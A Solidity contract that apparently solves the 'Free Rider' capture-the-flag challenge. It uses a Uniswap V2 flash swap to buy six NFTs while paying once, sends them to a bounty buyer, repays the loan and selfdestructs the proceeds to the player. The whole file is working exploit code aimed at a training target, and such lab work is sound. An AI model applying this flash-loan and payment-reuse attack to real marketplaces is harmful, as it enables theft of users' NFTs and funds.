// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "hardhat/console.sol";

interface IERC20 {
    function transfer(address recipient, uint256 amount) external returns(bool);
}

interface IUniswapV2Pair {
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
}

interface IUniswapV2Callee {
    function uniswapV2Call(address sender, uint amount0, uint amount1, bytes calldata data) external;
}

interface IFreeRiderNFTMarketplace {
    function offerMany(uint256[] calldata tokenIds, uint256[] calldata prices) external;
    function buyMany(uint256[] calldata tokenIds) external payable;
    function token() external returns (IERC721);
}

interface IWETH {
    function transfer(address recipient, uint256 amount) external returns (bool);
    function deposit() external payable;
    function withdraw(uint256 amount) external;
}

interface IERC721 {
    function setApprovalForAll(address operator, bool approved) external;
    function safeTransferFrom(address from, address to, uint256 tokenId, bytes memory data) external;
    function ownerOf(uint256 tokenId) external returns (address);
}

interface IERC721Receiver {
    function onERC721Received(address operator, address from, uint256 tokenId, bytes calldata data) external returns (bytes4);
}

contract FreeRiderExploit is IERC721Receiver{
    address player;
    IUniswapV2Pair uniswapPair;
    IFreeRiderNFTMarketplace nftMarketplace;
    IWETH weth;
    IERC721 nft;
    address freeRiderBuyer;
    constructor(IUniswapV2Pair _uniswapPair, IFreeRiderNFTMarketplace _nftMarketplace, IWETH _weth, address _buyer) {
        player = msg.sender;
        uniswapPair = _uniswapPair;
        nftMarketplace = _nftMarketplace;
        weth = _weth;
        nft = _nftMarketplace.token();
        freeRiderBuyer = _buyer;
    }

    function exploit(uint amount) public {
        uniswapPair.swap(amount, 0, address(this), "00");
    } 

    function uniswapV2Call(address sender, uint amount0, uint amount1, bytes calldata data) external {
        console.log("player: ", player);
        console.log("amount: ", amount0);
        console.log("before balance: ", address(this).balance);
        console.log("this contract: ", address(this));

        weth.withdraw(amount0);
        uint256 fee = ((amount0 * 3) / 997) + 1;
        uint256 amountToRepay = amount0 + fee;

        console.log("after balance: ", address(this).balance);

        uint256[] memory tokenIds = new uint256[] (6);
        for(uint i = 0; i < 6; i++) {
            tokenIds[i] = i;
        }

        nftMarketplace.buyMany{value: amount0}(tokenIds);

        for(uint i = 0; i < 6; i++) {
            nft.safeTransferFrom(address(this), freeRiderBuyer, i, abi.encode(player));

        }

        for(uint i = 0; i < 6; i++) {
            console.log("[%d]nft onwer: ", i, nft.ownerOf(i));
        }

        console.log("after buy balance: ", address(this).balance);
        

        weth.deposit{value:amountToRepay + 1 ether}();
        weth.transfer(address(uniswapPair), amountToRepay + 1 ether);
        console.log("after deposit balance: ", address(this).balance);

        selfdestruct(payable(player));
    }

    receive() external payable {}

    function onERC721Received(address, address, uint256, bytes calldata) external pure override returns (bytes4) {
        return IERC721Receiver.onERC721Received.selector;
    }

}